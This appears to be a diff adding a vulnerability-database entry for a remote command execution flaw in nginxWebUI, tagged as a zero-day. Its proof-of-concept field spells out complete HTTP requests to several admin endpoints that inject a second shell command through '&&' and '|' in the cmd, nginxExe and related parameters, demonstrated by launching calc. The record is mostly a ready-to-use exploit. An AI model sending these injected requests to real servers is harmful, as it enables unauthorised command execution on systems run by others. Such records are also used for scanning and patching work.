@@ -1,0 +1,8 @@
+vendor = "nginx"
+name = "nginxWebUI 远程命令执行漏洞"
+type = "RCE"
+source = "微信"
+info = "/AdminPage/conf/runCmd?cmd= /AdminPage/remote/cmdOver /Api/nginx/runNginxCmd /AdminPage/conf/reload?nginxExe= 请求体中可能存在： %26%26nginx&interval=1 remoteId="
+date = "08.11"
+poc = "https://xxx.com/AdminPage/conf/runCmd?cmd=calc%26%26nginx POST /AdminPage/remote/cmdOver HTTP/1.1 Host: 127.0.0.1:8080 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Origin: http://127.0.0.1:8080 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: http://127.0.0.1:8080/adminPage/remote Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 51 remoteId=local&cmd=start calc%26%26nginx&interval=1 POST /Api/nginx/runNginxCmd HTTP/1.1 Host: 127.0.0.1:8080 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Origin: http://127.0.0.1:8080 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: http://127.0.0.1:8080/adminPage/remote Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 19 cmd=calc%26%26nginx https://xxx.com/AdminPage/conf/reload?nginxExe=calc%20%7C"
+label = "0day"
